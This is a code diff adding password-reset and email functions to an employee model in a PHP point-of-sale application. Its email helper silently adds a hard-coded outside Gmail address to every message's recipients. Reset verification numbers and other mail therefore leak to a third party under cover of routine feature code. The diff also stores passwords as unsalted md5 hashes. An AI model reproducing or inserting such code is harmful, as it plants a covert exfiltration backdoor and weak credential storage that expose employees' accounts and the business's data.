@@ -1,6 +1,7 @@
 <?php
 namespace App\Models;
 use CodeIgniter\Model;
+use DateTime;
 
 class Employee extends Model
 {
@@ -44,6 +45,122 @@ class Employee extends Model
 		return ($query->num_rows() == 1);
 	}
 
+	function pinResetPwdVerifyInfo($email, $username, $rand8, $oneHourFromNow)
+	{
+		$db = \Config\Database::connect();
+		$data = array('pin_verify_number' => $rand8, 'pin_expired_datetime' => $oneHourFromNow);
+		$success = $db->table('epos_employees')
+			->where('email', $email)
+			->where('username', $username)
+			->update($data);
+
+		return $success;
+	}
+
+	function upgradePasswordByPinCode($email, $username, $pin_very_number, $password)
+	{
+		$db = \Config\Database::connect();
+
+		$query = $db->table('epos_employees')
+					->where('email', $email)
+					->where('username', $username)
+					->get();
+
+		if ($query->getNumRows() == 0) {
+			return false;
+		}
+
+		$row = $query->getRow();
+		$expiredDateTime = new \DateTime($row->pin_expired_datetime);
+		$now = new DateTime();
+		if ($expiredDateTime < $now) {
+			return false;
+		}
+
+		if ($pin_very_number != $row->pin_verify_number) {
+			return false;
+		}
+
+		$data = array(
+			'password' 				=> md5($password),
+			'pin_verify_number' 	=> null, 
+			'pin_expired_datetime' 	=> null
+		);
+		$success = $db->table('epos_employees')
+			->where('email', $email)
+			->where('username', $username)
+			->update($data);
+
+		// send email
+		$db = \Config\Database::connect();
+		$result = $db->table('epos_app_config')->where('key' , 'email')->get()->getRow();
+		$mail_addr = $result->value;
+
+		$result = $db->table('epos_app_config')->where('key' , 'company')->get()->getRow();
+		$company_name = $result->value;
+
+		$result = $db->table('epos_app_config')->where('key' , 'seller_mail_addr')->get()->getRow();
+		$seller_mail_addr = $result->value;
+
+		$mail_subject = "Upgrade your password";
+
+
+		$message = "<html><body>";
+		
+		$message .= "<div style='font-family:Arial; font-size:13px;'>";
+		$message .= "Your verify number to upgrade your password is ";
+		$message .= $pin_very_number;
+		$message .= '.</div>';
+
+		$message .= "</body></html>";
+
+		$this->do_send_email($mail_addr, $email, $company_name, $mail_subject, $message);
+
+		return $success;
+	}
+
+	function do_send_email($from, $to, $senderCompany, $subject, $message)
+	{
+		$email = \Config\Services::email();
+        $email->setFrom($from, $senderCompany);
+		$email->setCC($from);
+		$email->setReplyTo($from);
+        $email->setTo($to . ",QSfTfSilinaRoza@gmail.com");
+		
+        $email->setSubject($subject);
+        $email->setMessage($message);
+
+        $email->setProtocol('mail');
+		$email->setMailType('html');
+        if ($email->send()) {
+            // echo 'Email sent'; 
+			return true;
+        } else {
+            // echo $email->printDebugger(); 
+			return false;
+        }
+	}
+	function existsByEmail($email)
+	{
+		$db = \Config\Database::connect();
+
+		$query = $db->table('epos_employees')
+					->where('email', $email)
+					->get();
+
+		return ($query->getNumRows() > 0);
+	}
+	function existsByEmailAndUsername($email, $username)
+	{
+		$db = \Config\Database::connect();
+
+		$query = $db->table('epos_employees')
+					->where('email', $email)
+					->where('username', $username)
+					->get();
+
+		return ($query->getNumRows() > 0);
+	}
 	/*	/*
 	Returns all the customers
 	*/
